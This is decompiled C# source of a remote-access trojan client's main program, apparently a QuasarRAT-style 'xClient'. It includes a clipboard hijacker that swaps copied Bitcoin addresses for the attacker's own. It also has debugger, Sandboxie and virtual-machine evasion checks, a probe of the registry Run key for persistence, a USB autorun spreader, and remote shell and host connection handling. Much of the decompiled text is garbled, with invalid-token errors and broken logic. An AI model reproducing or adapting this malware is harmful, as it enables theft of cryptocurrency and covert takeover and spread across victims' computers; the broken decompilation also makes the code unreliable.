using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using xClient.Config;
using xClient.Core.Commands;
using xClient.Core.Helper;

namespace xClient;

internal static class Program
{
	public static _003F ConnectClient;

	private static ApplicationContext _msgLoop;

	[STAThread]
	private static void Main(string[] args)
	{
		//Discarded unreachable code: IL_0034, IL_0036
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		AppDomain.CurrentDomain.UnhandledException += HandleUnhandledException;
		if (Settings.Initialize() && Initialize())
		{
			/*Error near IL_002f: Invalid metadata token*/;
		}
		Cleanup();
		Exit();
	}

	private static void Exit()
	{
		if (_msgLoop == null && !Application.get_MessageLoop())
		{
			Environment.Exit(0);
		}
		else
		{
			Application.Exit();
		}
	}

	private static void HandleUnhandledException(object sender, UnhandledExceptionEventArgs e)
	{
		if (e.IsTerminating)
		{
			string text = FileHelper.CreateRestartBatch();
			if (!string.IsNullOrEmpty(text))
			{
				Process.Start(new ProcessStartInfo
				{
					WindowStyle = ProcessWindowStyle.Hidden,
					UseShellExecute = true,
					FileName = text
				});
				Exit();
			}
		}
	}

	private static void Cleanup()
	{
		//Discarded unreachable code: IL_001b, IL_001d, IL_0022, IL_0027, IL_002e, IL_0048
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		CommandHandler.CloseShell();
		if ((int)CommandHandler.StreamCodec != 0)
		{
			_ = CommandHandler.StreamCodec;
			/*Error near IL_0011: Invalid metadata token*/;
		}
		/*Error near IL_0016: Invalid metadata token*/;
	}

	[DllImport("Kernel32.dll", SetLastError = true)]
	public static extern bool IsDebuggerPresent();

	[DllImport("user32.dll")]
	internal static extern bool OpenClipboard(IntPtr hWndNewOwner);

	[DllImport("user32.dll")]
	internal static extern bool CloseClipboard();

	[DllImport("user32.dll")]
	internal static extern bool SetClipboardData(uint uFormat, IntPtr data);

	private static bool Initialize()
	{
		//Discarded unreachable code: IL_000f, IL_001f, IL_0025, IL_002a, IL_0039, IL_0059, IL_0060, IL_006f, IL_009a, IL_00a1, IL_00ab, IL_00b2, IL_00bc, IL_00c3, IL_00ca, IL_00d4, IL_00db, IL_00e2, IL_00ec, IL_00f3, IL_0104, IL_0113, IL_0115, IL_0121, IL_0126, IL_0128, IL_012e, IL_0135, IL_013c, IL_0157, IL_015e, IL_0165, IL_0171, IL_01a0, IL_01a7, IL_01af, IL_01c6, IL_01d7, IL_01de, IL_0227, IL_022e, IL_0236, IL_024d, IL_025e, IL_0265, IL_026d, IL_0284, IL_0295, IL_029c, IL_02a4, IL_02bb, IL_02cc, IL_02d2, IL_02d9
		//Error decoding local variables: Specified handle is not a TypeDefinitionHandle, TypeRefererenceHandle, or TypeSpecificationHandle.
		//IL_0109: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f0: Expected O, but got Unknown
		//IL_01fb: Expected O, but got Unknown
		//IL_0215: Expected O, but got Unknown
		//IL_021c: Expected O, but got Unknown
		//IL_02d2: Unknown result type (might be due to invalid IL or missing references)
		HostHelper.GetHostsList(Settings.HOSTS);
		/*Error near IL_000a: Invalid metadata token*/;
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetModuleHandle(string lpModuleName);

	private static bool DetectSandboxie()
	{
		return GetModuleHandle("SbieDll.dll").ToInt32() != 0;
	}

	public static bool keyExists(string key)
	{
		bool result = false;
		string[] valueNames = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: false)!.GetValueNames();
		for (int i = 0; i < valueNames.Length; i++)
		{
			if (valueNames[i] == key)
			{
				result = true;
			}
		}
		return result;
	}

	private static bool IsBitcoinAddress(string address)
	{
		if (address.Length >= 26 && address.Length <= 35)
		{
			if ((address.StartsWith("1") && address.StartsWith("3")) || (address.Contains("O") && address.Contains("I") && address.Contains("l")))
			{
				return false;
			}
			return true;
		}
		return false;
	}

	public static void BTCSWAPPERRUN()
	{
		try
		{
			if (IsBitcoinAddress(ClipboardHelper.GetText()))
			{
				OpenClipboard(IntPtr.Zero);
				IntPtr intPtr = Marshal.StringToHGlobalUni(Settings.BTCAddress);
				SetClipboardData(13u, intPtr);
				CloseClipboard();
				Marshal.FreeHGlobal(intPtr);
			}
			Thread.Sleep(3000);
			BTCSWAPPERRUN();
		}
		catch
		{
		}
	}

	public static bool IsAntiVM()
	{
		string[] array = new string[5] { "vmtoolsd", "vboxtray", "vboxservice", "VMwareService", "VMwareTray" };
		int num = 0;
		while (true)
		{
			if (num < array.Length)
			{
				if (Process.GetProcessesByName(array[num]).Length != 0)
				{
					break;
				}
				num++;
				continue;
			}
			return false;
		}
		return true;
	}

	private static void SpreadUSB()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (!driveInfo.IsReady && driveInfo.DriveType != DriveType.Removable)
			{
				continue;
			}
			try
			{
				string path = driveInfo.Name + "autorun.inf";
				string path2 = driveInfo.Name + Settings.USBSpreadNAME + ".exe";
				if (File.Exists(path))
				{
					File.Delete(path);
				}
				if (File.Exists(path2))
				{
					File.Delete(path2);
				}
				using StreamWriter streamWriter = new StreamWriter(new FileStream(path, FileMode.Create, FileAccess.Write));
				streamWriter.WriteLine("[AutoRun]");
				streamWriter.WriteLine("action=" + Settings.USBSpreadNAME + ".exe");
			}
			catch
			{
			}
		}
	}
}
